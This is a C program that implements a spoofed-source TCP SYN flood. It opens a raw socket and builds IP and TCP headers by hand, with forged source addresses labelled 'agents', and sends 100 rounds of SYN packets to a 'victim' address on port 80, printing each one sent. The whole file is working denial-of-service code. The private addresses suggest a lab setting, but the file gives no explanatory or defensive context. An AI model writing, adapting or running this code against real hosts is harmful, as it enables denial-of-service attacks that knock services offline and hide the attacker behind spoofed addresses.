
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h> // Required for TCP Header
#include <unistd.h>
#include <time.h>

// Pseudo header needed for TCP checksum calculation
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
};

// Checksum calculation function
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

int main(void) {
    // 1. Configuration
    int sockfd;
    char *agents[] = {"10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5"}; 
    char victim_ip[] = "10.0.0.1"; // The victim
    int dest_port = 80;            // Target HTTP port (common for attacks)
    int rounds = 100;              // Number of loops

    struct sockaddr_in dest_addr;
    char *packet;
    int num_agents = sizeof(agents) / sizeof(agents[0]);

    // 2. Create Raw Socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Error creating socket");
        exit(1);
    }

    // 3. Set IP_HDRINCL (We tell kernel we provide the IP Header)
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(1);
    }

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(victim_ip);
    dest_addr.sin_port = htons(dest_port);

    srand(time(0)); // Seed random number generator

    printf("Starting TCP SYN Flood on %s using %d agents...\n", victim_ip, num_agents);

    // 4. Attack Loop
    for (int r = 0; r < rounds; r++) {
        for (int i = 0; i < num_agents; i++) {
            
            // Allocate memory for packet
            int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
            packet = malloc(packet_len);
            if (!packet) { perror("Malloc failed"); exit(1); }
            
            memset(packet, 0, packet_len);

            // Pointers to headers
            struct iphdr *iph = (struct iphdr *)packet;
            struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

            // --- Fill IP Header ---
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
            iph->id = htons(rand() % 65535); // Random ID
            iph->frag_off = 0;
            iph->ttl = 255;
            iph->protocol = IPPROTO_TCP; // Protocol is TCP (6)
            iph->check = 0;              // Set to 0 before calculation
            iph->saddr = inet_addr(agents[i]); // Spoofed Source IP
            iph->daddr = dest_addr.sin_addr.s_addr;
            
            // Calculate IP Checksum
            iph->check = checksum((unsigned short *)packet, iph->tot_len);

            // --- Fill TCP Header ---
            tcph->source = htons(rand() % 65535); // Random source port
            tcph->dest = htons(dest_port);        // Target port
            tcph->seq = 0;
            tcph->ack_seq = 0;
            tcph->doff = 5;      // Data offset
            tcph->fin = 0;
            tcph->syn = 1;       // **SYN Flag Set** (The Attack Vector)
            tcph->rst = 0;
            tcph->psh = 0;
            tcph->ack = 0;
            tcph->urg = 0;
            tcph->window = htons(5840); // Max window size
            tcph->check = 0;
            tcph->urg_ptr = 0;

            // --- Calculate TCP Checksum (Requires Pseudo Header) ---
            struct pseudo_header psh;
            psh.source_address = inet_addr(agents[i]);
            psh.dest_address = dest_addr.sin_addr.s_addr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_length = htons(sizeof(struct tcphdr));
            
            // Copy TCP header into pseudo header for checksum calculation
            memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
            
            tcph->check = checksum((unsigned short *)&psh, sizeof(struct pseudo_header));

            // 5. Send Packet
            if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
                perror("Send failed");
            } else {
                printf("TCP SYN packet sent from %s to %s (Port %d)\n", agents[i], victim_ip, dest_port);
            }

            free(packet);
        }
    }
    
    close(sockfd);
    return 0;
}
